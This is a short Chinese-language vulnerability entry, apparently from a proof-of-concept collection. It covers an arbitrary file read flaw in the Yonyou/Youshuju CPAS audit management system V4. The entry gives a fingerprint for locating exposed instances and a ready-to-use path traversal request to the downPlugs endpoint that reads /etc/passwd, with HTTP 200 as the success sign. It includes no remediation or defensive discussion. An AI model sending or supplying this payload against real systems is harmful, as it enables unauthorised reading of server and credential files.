# 用友-友数聚科技CPAS审计管理系统V4downPlugs存在任意文件读取漏洞

用友 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="CPAS审计管理系统"`
- **请求**：`GET /cpasm4/plugInManController/downPlugs?fileId=../../../../../etc/passwd&fileName=%E9%87%91%E6%A0%BCIE%E5%85%BC%E5%AE%B9%E6%B5%8F%E8%A7%88%E5%99%A8 HTTP/1.1`
- **响应特征**：200